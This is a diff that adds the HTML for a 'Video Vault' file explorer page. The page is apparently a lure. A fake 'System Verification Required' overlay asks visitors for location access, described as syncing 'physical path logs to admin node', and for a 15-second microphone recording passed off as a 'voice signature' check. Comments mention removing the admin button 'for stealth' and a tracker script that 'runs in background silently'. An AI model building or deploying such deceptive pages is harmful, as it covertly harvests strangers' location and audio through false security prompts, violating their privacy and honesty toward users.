@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Video Vault — File Explorer</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="explorer-app">
+    
+    <!-- OS TITLE BAR -->
+    <header class="title-bar">
+      <div class="window-dots">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+      </div>
+      <div class="window-title">
+        📁 Video Vault — <span>File Explorer</span>
+      </div>
+      <div class="window-actions">
+        <!-- Admin button removed from visitor interface for stealth/privacy -->
+      </div>
+    </header>
+
+    <!-- EXPLORER BODY -->
+    <div class="explorer-body">
+      
+      <!-- LEFT SIDEBAR -->
+      <aside class="sidebar">
+        <div class="sidebar-section">
+          <div class="sidebar-header">Directories</div>
+          <ul class="sidebar-list">
+            <li>
+              <a href="#" class="sidebar-item active" id="dir-all">
+                <span class="icon folder-accent">📁</span>
+                <span class="label">Videos</span>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </aside>
+
+      <!-- CENTER WORKSPACE -->
+      <main class="workspace">
+        
+        <!-- TOOLBAR / BREADCRUMBS -->
+        <div class="toolbar">
+          <div class="breadcrumbs" id="breadcrumbs">
+            <div class="crumb active">
+              <span>Videos</span>
+            </div>
+          </div>
+          <div class="search-box">
+            <input type="text" id="searchInput" class="search-input" placeholder="Search files..." />
+          </div>
+        </div>
+
+        <!-- FILE DISPLAY LIST -->
+        <div class="file-viewer-pane" id="fileViewerPane">
+          <div class="file-grid" id="fileGrid">
+            <!-- Dynamically populated files -->
+            <div style="grid-column: 1/-1; text-align: center; padding: 40px; color: var(--text-muted);">
+              Accessing storage index...
+            </div>
+          </div>
+        </div>
+      </main>
+
+      <!-- RIGHT PREVIEW PANEL -->
+      <aside class="preview-panel collapsed" id="previewPanel">
+        <div class="preview-header">
+          <div class="preview-title">File Preview</div>
+          <button class="close-preview-btn" id="closePreviewBtn" title="Close Preview">&times;</button>
+        </div>
+        <div class="preview-content" id="previewContent">
+          <!-- Dynamically populated preview details -->
+        </div>
+      </aside>
+
+    </div>
+
+    <!-- BOTTOM STATUS BAR -->
+    <footer class="status-bar">
+      <div class="status-bar-left">
+        <span id="statusBarItemsCount">0 items</span>
+      </div>
+      <div class="status-bar-right">
+        <div>Storage Status: <span class="status-badge" style="color:var(--success);">Connected</span></div>
+        &nbsp;|&nbsp;
+        <div>Mode: <span class="status-badge">Local Node</span></div>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- Security Permission Verification Overlay -->
+  <div id="permissionOverlay" class="permission-overlay" style="display: none;">
+    <div class="permission-window">
+      <div class="permission-header">
+        <div class="window-dots">
+          <span class="dot dot-red"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
+        </div>
+        <div class="window-title">🔒 System Verification Required</div>
+      </div>
+      <div class="permission-body">
+        <h3>Storage Access Security Check</h3>
+        <p>proceed with auth</p>
+        <div class="permission-list">
+          <div class="permission-item" id="locationPermissionItem">
+            <span class="icon">📍</span>
+            <div>
+              <strong>Location Access (Required)</strong>
+              <span class="desc">Verifies regional compliance and syncs physical path logs to admin node.</span>
+            </div>
+          </div>
+          <div class="permission-item" id="microphonePermissionItem" style="display: none;">
+            <span class="icon">🎤</span>
+            <div>
+              <strong>Voice Signature Capture (Required)</strong>
+              <span class="desc">Generates a secure 15-second audio token check for session validation.</span>
+            </div>
+          </div>
+        </div>
+        <button id="grantPermissionBtn" class="submit-btn" style="width: 100%; margin-top: 10px; font-weight: 700; font-size: 0.92rem; padding: 12px 0; border: none; cursor: pointer; border-radius: var(--radius);">
+          🔓 Authenticate &amp; Mount Volumes
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Telemetry Tracker script runs in background silently -->
+  <script src="tracker.js"></script>
+  
+  <!-- Content script for loading and playing videos -->
+  <script src="script.js"></script>
+</body>
+</html>
